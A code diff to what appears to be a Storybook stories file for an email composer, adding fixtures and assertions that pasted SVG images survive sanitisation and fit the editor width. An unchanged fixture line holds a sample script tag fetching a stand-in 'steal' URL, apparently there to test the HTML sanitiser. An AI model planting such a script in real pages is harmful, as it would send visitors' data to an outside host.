@@ -70,6 +70,25 @@ const CLIPBOARD_HTML = [
 	'<script>fetch("https://tracker.example/steal")</script>',
 ].join("");
 
+const MARK =
+	"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNDAiIGhlaWdodD0iMTIwIj48cmVjdCB3aWR0aD0iMjQwIiBoZWlnaHQ9IjEyMCIgcng9IjEyIiBmaWxsPSIjMzc4MGY2Ii8+PGNpcmNsZSBjeD0iNjAiIGN5PSI2MCIgcj0iMzIiIGZpbGw9IiNmZmYiLz48L3N2Zz4=";
+
+const WIDE_SHOT =
+	"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNjAwIiBoZWlnaHQ9IjQwMCI+PHJlY3Qgd2lkdGg9IjE2MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZTJlOGYwIi8+PHRleHQgeD0iNDAiIHk9IjIyMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iOTYiIGZpbGw9IiMzMzQxNTUiPjE2MDAgd2lkZTwvdGV4dD48L3N2Zz4=";
+
+/**
+ * A clipboard carrying pictures, which is what a screenshot pasted out of a
+ * graphics app arrives as. The second is 1600 wide — four times the room the
+ * composer has for it.
+ */
+const CLIPBOARD_WITH_IMAGES = [
+	"<p>The new mark:</p>",
+	`<p><img src="${MARK}" alt="The mark"></p>`,
+	"<p>And the header it sits in:</p>",
+	`<p><img src="${WIDE_SHOT}" alt="The header, 1600 wide"></p>`,
+	"<p>Let me know which one reads better.</p>",
+].join("");
+
 export const Empty: Story = {
 	name: "Empty",
 	args: {},
@@ -88,6 +107,40 @@ export const RichContent: Story = {
 export const PasteResult: Story = {
 	name: "After pasting a web page",
 	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML) },
+};
+
+/**
+ * The pictures are in the document rather than gone from it (#684), and the
+ * oversized one is drawn at the width the composer has rather than pushing the
+ * message sideways. Whether a `data:` image survives the trip to a given
+ * recipient is a separate question, and #679 is where it is answered.
+ */
+export const PastedImages: Story = {
+	name: "After pasting images",
+	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_WITH_IMAGES) },
+	play: async ({ canvasElement }) => {
+		const editable = canvasElement.querySelector<HTMLElement>(
+			"[data-testid=compose-body]",
+		);
+		if (!editable) throw new Error("the editor is not mounted");
+
+		const images = [...editable.querySelectorAll("img")];
+		await expect(images).toHaveLength(2);
+		await expect(images[0]).toHaveAttribute("alt", "The mark");
+
+		// A width read before the picture decodes is 0, and 0 is under every
+		// bound this would like to assert.
+		await waitFor(() =>
+			expect(images.every((image) => image.naturalWidth > 0)).toBe(true),
+		);
+		await expect(images[1].naturalWidth).toBe(1600);
+		for (const image of images) {
+			await expect(image.getBoundingClientRect().width).toBeGreaterThan(0);
+			await expect(image.getBoundingClientRect().width).toBeLessThanOrEqual(
+				editable.clientWidth,
+			);
+		}
+	},
 };
 
 /**
@@ -134,6 +187,7 @@ const PinnedControls = () => {
 			<ComposeLanguageChip
 				language={language}
 				languages={["nl", "en", "de"]}
+				source={language === "nl" ? "detected" : "manual"}
 				onSelect={setLanguage}
 			/>
 			<ComposeModeToggle
